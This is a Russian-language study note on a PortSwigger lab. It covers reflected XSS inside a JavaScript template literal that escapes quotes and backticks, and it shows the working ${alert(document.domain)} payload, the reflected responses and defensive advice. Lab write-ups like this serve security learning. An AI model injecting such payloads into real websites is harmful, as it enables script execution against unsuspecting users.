#### XSS в шаблонных литералах JavaScript      ${...}
### ${...} можно использовать в литералах
### литерал можно легко узнать по обратным кавычкам \` \`
## ЮНИКОД кодировка
если контекст XSS находится внутри JS литерала ${...}
и если нет возможности выйти из строки
то можно использовать синтаксис ${...} для встраивания выражения JavaScript, которое будет выполнено при обработке литерала

пример
```html
<script> ... var input = `controllable data here`; ... </script>

пейлоад -->

${alert(document.domain)}

```

лаба https://portswigger.net/web-security/cross-site-scripting/contexts/lab-javascript-template-literal-angle-brackets-single-double-quotes-backslash-backticks-escaped
##### Reflected XSS into a template literal with angle brackets, single, double quotes, backslash and backticks Unicode-escaped
 задание:
 в поиске есть xss
 нужно вызвать алерт

----

пейлоад через поиск 7777
отразился вот сюда
```html
<script>
 var message = `0 search results for '7777'`;
 document.getElementById('searchMessage').innerText = message;
</script>
```
пейлоад оборачивается в одинар кавы  '7777'

-----

пейлоад ';alert=("777")
ответ
```html
<script>
 var message = `0 search results for '\u0027;alert=(\u0022777\u0022)'`;
 document.getElementById('searchMessage').innerText = message;
</script>
```

появились слеши перед кавычками
и еще сами кавычки закодировались 

'    в  \u0027; 
 "  в   \u0022 
### это ЮНИКОД кодировка + JS понимает его хорошо

-----
пробую пейлоад из примера!
пейлоад ${alert(document.domain)}
ответ
```html
<script>
   var message = `0 search results for '${alert(document.domain)}'`;
   document.getElementById('searchMessage').innerText = message;
</script>
```
алерт появился! лаба решена!

то есть несмотря на то, что пейлоад оборачивался в кавычки, не помешало ему выполниться!

-----

## разбор

мой пейлоад попадал в шаблонный литерал в обратных кавычках + в одинарных кавычках

в шаблонные литералы можно встраивать выражения через ${...}

сервер не стал его экранировать, потому что это был не спецсимвол, а часть синтаксиса  
js выполнил alert при загрузке страницы, и лаба решилась

>	обычные строки пишутся в одинарных ' или двойных " кавычках  
		а шаблонные литералы — всегда в обратных
## выводы: 
шаблонные литералы сами создают уязвимость, если в них попадают пользовательские данные  

даже когда кавычки экранируются через юникод, выражение ${...} всё равно срабатывает  
главное здесь — не пытаться закрыть строку, а использовать встроенный механизм самого js

## как защититься: 

не вставлять пользовательский ввод напрямую в шаблонные литералы

использовать json.stringify для безопасного кодирования  

применять csp чтобы запретить выполнение инлайн-кода


🟢   🟣  🟠

